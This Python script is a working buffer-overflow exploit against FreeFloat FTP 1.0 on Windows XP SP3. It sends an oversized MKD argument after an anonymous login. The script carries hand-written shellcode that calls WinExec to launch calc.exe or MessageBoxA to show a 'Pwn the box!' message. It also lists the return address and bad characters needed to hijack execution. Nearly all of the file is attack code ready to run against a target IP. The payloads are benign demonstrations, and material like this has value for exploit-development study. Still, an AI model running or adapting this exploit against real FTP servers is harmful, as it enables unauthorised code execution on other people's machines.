#!/usr/bin/python
   
#----------------------------------------------------------------------------------#
# Exploit: FreeFloat FTP 1.0 (MKD BOF)                                             #
# OS: Windows XP Professional SP3 Build 2600                                       #
# Architecture: x86                                                                #
#----------------------------------------------------------------------------------#
 
import socket
import sys

#----------------------------------------------------------------------------------#
# (*) WinExec                                                                      #
# (*) arwin.exe => Kernel32.dll - WinExec 0x7C8623AD                               #
# (*) MSDN Structure:                                                              #
#                                                                                  #
# UINT WINAPI WinExec(            => PTR to WinExec                                #
#   __in  LPCSTR lpCmdLine,       => calc.exe                                      #
#   __in  UINT uCmdShow           => 0x1                                           #
# );                                                                               #
#                                                                                  #
# Final Size => 26-bytes (metasploit version size => 227-bytes)                    #
#----------------------------------------------------------------------------------#

WinExec = (
"\x33\xc0"                          # XOR EAX,EAX
"\x50"                              # PUSH EAX      => padding for lpCmdLine
"\x68\x2E\x65\x78\x65"              # PUSH ".exe"
"\x68\x63\x61\x6C\x63"              # PUSH "calc"
"\x8B\xC4"                          # MOV EAX,ESP
"\x6A\x01"                          # PUSH 1
"\x50"                              # PUSH EAX
"\xBB\xAD\x23\x86\x7C"              # MOV EBX,kernel32.WinExec
"\xFF\xD3")                         # CALL EBX

#----------------------------------------------------------------------------------#
# (*) MessageBoxA                                                                  #
# (*) arwin.exe => user32.dll - MessageBoxA 0x7E4507EA                             #
# (*) MSDN Structure:                                                              #
#                                                                                  #
# int WINAPI MessageBox(          => PTR to MessageBoxA                            #
#   __in_opt  HWND hWnd,          => 0x0                                           #
#   __in_opt  LPCTSTR lpText,     => Pwn the box!                                  #
#   __in_opt  LPCTSTR lpCaption,  => maz                                           #
#   __in      UINT uType          => 0x0                                           #
# );                                                                               #
#                                                                                  #
# Final Size => 39-bytes (metasploit version size => 287-bytes)                    #
#----------------------------------------------------------------------------------#

MessageBoxA = (
"\x33\xc0"                          # XOR EAX,EAX
"\x50"                              # PUSH EAX      => padding for lpCaption
"\x68\x6D\x61\x7A\x20"              # PUSH "maz "
"\x8B\xCC"                          # MOV ECX,ESP   => PTR to lpCaption
"\x50"                              # PUSH EAX      => padding for lpText
"\x68\x62\x6F\x78\x21"              # PUSH "box!"
"\x68\x74\x68\x65\x20"              # PUSH "the "
"\x68\x50\x77\x6E\x20"              # PUSH "Pwn "
"\x8B\xD4"                          # MOV EDX,ESP   => PTR to lpText
"\x50"                              # PUSH EAX - uType=0x0
"\x51"                              # PUSH ECX - lpCaption
"\x52"                              # PUSH EDX - lpText
"\x50"                              # PUSH EAX - hWnd=0x0
"\xBE\xEA\x07\x45\x7E"              # MOV ESI,USER32.MessageBoxA
"\xFF\xD6")
 
#----------------------------------------------------------------------------------#
# Badchars: \x00\x0A\x0D                                                           #
# 0x77c35459 : push esp #  ret  | msvcrt.dll                                       #
# shellcode at ESP => space 749-bytes                                              #
#----------------------------------------------------------------------------------#

# buffer = "\x90"*20 + WinExec
buffer = "\x90"*20 + MessageBoxA
evil = "A"*247 + "\x59\x54\xc3\x77" + buffer + "C"*(749-len(buffer))
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.82',21))
 
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close

